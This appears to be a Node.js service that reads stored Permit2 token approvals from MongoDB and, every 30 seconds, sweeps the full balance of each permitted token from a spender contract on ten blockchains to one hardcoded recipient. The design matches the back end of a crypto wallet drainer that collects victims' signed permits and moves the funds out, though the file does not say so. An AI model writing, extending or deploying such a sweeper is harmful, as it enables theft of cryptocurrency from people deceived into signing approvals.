require('dotenv').config();
const { MongoClient } = require('mongodb');
const { ethers } = require('ethers');

// Network configuration
const networkConfig = {
  1: { rpcUrl: process.env.MAINNET_URL, spenderAddress: process.env.MAINNET_SPENDER },
  8453: { rpcUrl: process.env.BASE_URL, spenderAddress: process.env.BASE_SPENDER },
  42161: { rpcUrl: process.env.ARBITRUM_URL, spenderAddress: process.env.ARBITRUM_SPENDER },
  56: { rpcUrl: process.env.BSC_URL, spenderAddress: process.env.BNB_SPENDER },
  10: { rpcUrl: process.env.OPTIMISM_URL, spenderAddress: process.env.OPTIMISM_SPENDER },
  7777777: { rpcUrl: process.env.ZORA_URL, spenderAddress: process.env.ZORA_SPENDER },
  43114: { rpcUrl: process.env.AVALANCHE_URL, spenderAddress: process.env.AVALANCHE_SPENDER },
  137: { rpcUrl: process.env.POLYGON_URL, spenderAddress: process.env.POLYGON_SPENDER },
  324: { rpcUrl: process.env.ZKSYNC_URL, spenderAddress: process.env.ZKSYNC_SPENDER },
  81457: { rpcUrl: process.env.BLAST_URL, spenderAddress: process.env.BLAST_SPENDER },
};

const MONGO_URI = process.env.MONGO_URI;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TO_ADDRESS = process.env.RECIPIENT_ADDRESS; // Hardcoded recipient

const client = new MongoClient(MONGO_URI);

// Permit2Spender contract ABI
const spenderAbi = [
  'function withdrawTokens(address token, uint256 amount, address to) external',
  'event TokensWithdrawn(address indexed owner, address indexed token, uint256 amount, address indexed to)',
];

// ERC-20 ABI to check balance
const erc20Abi = ['function balanceOf(address owner) view returns (uint256)'];

async function withdrawTokens() {
  try {
    await client.connect();
    const db = client.db('permit2DB');
    const permitsCollection = db.collection('permits');

    // Find permits that have been executed (transferred) but not yet withdrawn
    const permits = await permitsCollection.find({ executed: true, withdrawn: { $ne: true } }).toArray();
    if (permits.length === 0) {
      console.log('No executed permits found to withdraw');
      return;
    }

    for (const permitData of permits) {
      const { chainId, permitBatch } = permitData;

      if (!chainId || !networkConfig[chainId]) {
        console.log(`Unsupported chainId ${chainId} for permit: ${permitData._id}`);
        continue;
      }

      const { rpcUrl, spenderAddress } = networkConfig[chainId];
      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
      const spenderContract = new ethers.Contract(spenderAddress, spenderAbi, wallet);

      console.log(`Processing withdrawals for permit ${permitData._id} on chainId ${chainId}`);

      let allWithdrawalsSuccessful = true;

      for (const detail of permitBatch.details) {
        const tokenAddress = detail.token;

        // Check the spender contract's balance of the token
        const tokenContract = new ethers.Contract(tokenAddress, erc20Abi, provider);
        const contractBalance = await tokenContract.balanceOf(spenderAddress);
        console.log(`Contract balance of ${tokenAddress} on chainId ${chainId}: ${contractBalance.toString()}`);

        if (contractBalance.isZero()) {
          console.log(`No tokens to withdraw for ${tokenAddress} on chainId ${chainId}`);
          continue;
        }

        console.log(`Withdrawing ${contractBalance.toString()} of ${tokenAddress} to ${TO_ADDRESS} on chainId ${chainId}`);
        try {
          const tx = await spenderContract.withdrawTokens(tokenAddress, contractBalance, TO_ADDRESS, {
            gasLimit: 100000,
          });
          console.log(`Transaction submitted: ${tx.hash}`);

          const receipt = await tx.wait();
          console.log(`Withdrawal confirmed in block ${receipt.blockNumber}`);

          const event = receipt.events?.find(e => e.event === 'TokensWithdrawn');
          if (event) {
            console.log(`TokensWithdrawn event: Token=${event.args.token}, Amount=${event.args.amount.toString()}, To=${event.args.to}`);
          } else {
            console.warn('TokensWithdrawn event not found in receipt');
          }
        } catch (withdrawError) {
          console.error(`Withdrawal failed for ${tokenAddress}:`, withdrawError);
          allWithdrawalsSuccessful = false;
          continue;
        }
      }

      // Mark permit as withdrawn only if all withdrawals successful
      if (allWithdrawalsSuccessful) {
        await permitsCollection.updateOne(
          { _id: permitData._id },
          { $set: { withdrawn: true, withdrawnAt: new Date() } }
        );
        console.log(`Withdrawals marked as complete for permit ${permitData._id}`);
      }
    }
  } catch (error) {
    console.error('Withdrawal failed:', error);
  } finally {
    await client.close();
  }
}

async function runContinuously() {
  console.log('Starting continuous withdrawal service...');
  
  while (true) {
    try {
      await withdrawTokens();
    } catch (error) {
      console.error('Error in withdrawal cycle:', error);
    }
    
    console.log('Waiting 30 seconds before next check...');
    await new Promise(resolve => setTimeout(resolve, 30000));
  }
}

runContinuously().catch((error) => {
  console.error('Service failed:', error);
  process.exit(1);
});